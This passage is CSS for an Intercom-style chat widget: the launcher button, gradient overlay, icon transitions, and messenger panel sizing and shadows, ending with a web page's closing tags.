      transform: scale(0);
    }
    40% {
      opacity: 1;
    }
    100% {
      transform: scale(1);
    }
  }

  .intercom-lightweight-app {
    position: fixed;
    z-index: 2147483001;
    width: 0;
    height: 0;
    font-family: intercom-font, "Helvetica Neue", "Apple Color Emoji", Helvetica, Arial, sans-serif;
  }

  .intercom-lightweight-app-gradient {
    position: fixed;
    z-index: 2147483002;
    width: 500px;
    height: 500px;
    bottom: 0;
    right: 0;
    pointer-events: none;
    background: radial-gradient(
      ellipse at bottom right,
      rgba(29, 39, 54, 0.16) 0%,
      rgba(29, 39, 54, 0) 72%);
    animation: intercom-lightweight-app-gradient 200ms ease-out;
  }

  .intercom-lightweight-app-launcher {
    position: fixed;
    z-index: 2147483003;
    padding: 0 !important;
    margin: 0 !important;
    border: none;
    bottom: 20px;
    right: 20px;
    max-width: 48px;
    width: 48px;
    max-height: 48px;
    height: 48px;
    border-radius: 50%;
    background: #1C2538;
    cursor: pointer;
    box-shadow: 0 1px 6px 0 rgba(0, 0, 0, 0.06), 0 2px 32px 0 rgba(0, 0, 0, 0.16);
    transition: transform 167ms cubic-bezier(0.33, 0.00, 0.00, 1.00);
    box-sizing: content-box;
  }


  .intercom-lightweight-app-launcher:hover {
    transition: transform 250ms cubic-bezier(0.33, 0.00, 0.00, 1.00);
    transform: scale(1.1)
  }

  .intercom-lightweight-app-launcher:active {
    transform: scale(0.85);
    transition: transform 134ms cubic-bezier(0.45, 0, 0.2, 1);
  }


  .intercom-lightweight-app-launcher:focus {
    outline: none;

    
  }

  .intercom-lightweight-app-launcher-icon {
    display: flex;
    align-items: center;
    justify-content: center;
    position: absolute;
    top: 0;
    left: 0;
    width: 48px;
    height: 48px;
    transition: transform 100ms linear, opacity 80ms linear;
  }

  .intercom-lightweight-app-launcher-icon-open {
    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-open svg {
    width: 24px;
    height: 24px;
  }

  .intercom-lightweight-app-launcher-icon-open svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-launcher-icon-self-serve {
    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-self-serve svg {
    height: 44px;
  }

  .intercom-lightweight-app-launcher-icon-self-serve svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-launcher-custom-icon-open {
    max-height: 24px;
    max-width: 24px;

    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-minimize {
    
        opacity: 0;
        transform: rotate(-60deg) scale(0);
      
  }

  .intercom-lightweight-app-launcher-icon-minimize svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-messenger {
    position: fixed;
    z-index: 2147483003;
    overflow: hidden;
    background-color: white;
    animation: intercom-lightweight-app-messenger 250ms cubic-bezier(0, 1, 1, 1);
    transform-origin: bottom right;
    
        width: 400px;
        height: calc(100% - 104px);
        max-height: 704px;
        min-height: 250px;
        right: 20px;
        bottom: 84px;
        box-shadow: 0 5px 40px rgba(0,0,0,0.16);
      

    border-radius: 16px;
  }

  .intercom-lightweight-app-messenger-header {
    height: 64px;
    border-bottom: none;
    background: #1c2538

    
  }

  .intercom-lightweight-app-messenger-footer{
    position:absolute;
    bottom:0;
    width: 100%;
    height: 80px;
    background: #fff;
    font-size: 14px;
    line-height: 21px;
    border-top: 1px solid rgba(0, 0, 0, 0.05);
    box-shadow: 0px 0px 25px rgba(0, 0, 0, 0.05);
    
  }

  @media print {
    .intercom-lightweight-app {
      display: none;
    }
  }
</style></div></body></html>